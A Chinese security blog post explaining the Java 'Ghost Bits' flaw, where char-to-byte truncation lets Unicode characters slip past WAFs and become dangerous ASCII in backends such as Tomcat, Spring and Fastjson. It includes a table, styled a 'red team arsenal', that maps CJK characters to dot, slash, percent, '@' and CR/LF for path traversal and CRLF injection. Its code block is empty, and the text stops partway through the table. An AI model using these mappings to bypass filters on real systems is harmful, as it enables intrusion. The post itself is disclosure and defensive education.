#  java幽灵比特位(Ghost Bits)漏洞介绍&&相关测试工具推荐  
原创 陌笙
                    陌笙  陌笙不太懂安全   2026-05-03 10:30  
  
免责声明  
```
由于传播、利用本公众号所提供的信息而造成
的任何直接或者间接的后果及损失，均由使用
者本人负责，公众号陌笙不太懂安全及作者不
为此承担任何责任，一旦造成后果请自行承担！
如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```  
## 一、漏洞概述  
  
Ghost Bits（幽灵比特位）是 Black Hat Asia 2026 上正式披露的一类 Java 生态底层安全缺陷。  
**该问题不是某个具体组件的实现错误，而是源于 Java 语言中 char 与 byte 类型之间窄化转换（Narrowing Conversion）的“静默截断”行为**  
引发的架构级安全风险。  
  
这个漏洞的核心危害在于：  
**安全检测链路（WAF/IDS）与应用执行链路对同一输入的解析语义不一致**  
——前置防护看到的是“无害”的 Unicode 字符，而后端执行时却恢复为危险 ASCII 攻击载荷。  
  
该漏洞影响范围极广，涉及 Tomcat、Jetty、Spring、Fastjson、Jackson、Openfire 等大量主流 Java 框架与中间件。  
## 二、技术原理  
### 2.1 根本原因：char 与 byte 的位数差异  
  
Java 中两个基础类型的位宽差异是“幽灵比特位”的根源：  
  
<table><thead><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n197" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 121.312px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">类型</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n198" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 285.712px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">位宽</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n199" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 474.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">范围</span></span></span></th></tr></thead><tbody><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n201" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 121.312px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">char</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n202" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 285.712px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">16 位（2 字节）</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n203" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 474.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">0x0000 ~ 0xFFFF（无符号）</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n205" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 121.312px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">byte</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n206" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 285.712px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">8 位（1 字节）</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n207" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 474.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">-128 ~ 127（有符号）</span></span></span></td></tr></tbody></table>  
当代码中出现以下高危写法时，极大概率会触发 Ghost Bits 转化：  
  
java  
```
```  
### 2.2 常见 Ghost Bits 映射表（红队武器库）  
  
攻击者可以  
**选择高 8 位任意、低 8 位固定为特定危险 ASCII 的 Unicode 字符**  
，实现对任意危险字符的“隐身化”。  
  
<table><thead><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n221" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 108.125px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">目标字节</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n222" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 70.0375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">Hex</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n223" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 298.212px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">危险语义</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n224" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 241.65px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">示例 Ghost Bits 字符</span></span></span></th><th style="box-sizing: border-box;padding: 6px 13px;font-weight: bold;border-width: 1px 1px 0px;border-top-style: solid;border-right-style: solid;border-left-style: solid;border-top-color: rgb(223, 226, 229);border-right-color: rgb(223, 226, 229);border-left-color: rgb(223, 226, 229);border-image: initial;border-bottom-style: initial;border-bottom-color: initial;margin: 0px;text-align: left;"><span cid="n225" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 109.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">Unicode</span></span></span></th></tr></thead><tbody><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n227" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 108.125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">.</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n228" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 70.0375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">0x2E</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n229" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 298.212px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">路径穿越、文件扩展名分隔</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n230" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 241.65px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">阮</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n231" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 109.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">U+962E</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n233" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 108.125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">/</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n234" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 70.0375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">0x2F</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n235" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 298.212px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">目录分隔符</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n236" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 241.65px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">丯</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n237" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 109.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">U+4E2F</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n239" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 108.125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">%</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n240" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 70.0375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">0x25</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n241" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 298.212px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">URL 编码标识</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n242" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 241.65px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">严</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n243" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 109.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">U+4E25</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n245" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 108.125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">u</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n246" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 70.0375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">0x75</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n247" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 298.212px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">URL 编码 </span></span><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">%u</span></code></span><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""> 前缀</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n248" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 241.65px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">灵</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n249" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 109.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">U+7075</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n251" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 108.125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">0</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n252" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 70.0375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">0x30</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n253" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 298.212px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">数字相关绕过</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n254" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 241.65px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">丰</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n255" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 109.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">U+4E30</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n257" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 108.125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">2</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n258" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 70.0375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">0x32</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n259" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 298.212px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">数字相关绕过</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n260" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 241.65px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">甲</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n261" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 109.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">U+7532</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n263" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 108.125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">j</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n264" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 70.0375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">0x6A</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n265" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 298.212px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">JSP 扩展名</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n266" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 241.65px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">陪</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n267" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 109.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">U+966A</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n269" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 108.125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">@</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n270" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 70.0375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">0x40</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n271" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 298.212px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">Fastjson </span></span><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">@type</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n272" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 241.65px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">乀</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n273" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 109.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">U+4E40</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n275" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 108.125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">\r</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n276" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 70.0375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">0x0D</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n277" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 298.212px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">CRLF 注入</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n278" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 241.65px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">瘍</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n279" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 109.975px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">U+760D</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;background-color: rgb(248, 248, 248);"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n281" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 108.125px;min-height: 10px;"><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">\n</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n282" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 70.0375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">0x0A</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;text-align: left;"><span cid="n283" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 298.212px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">CRLF 注入</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 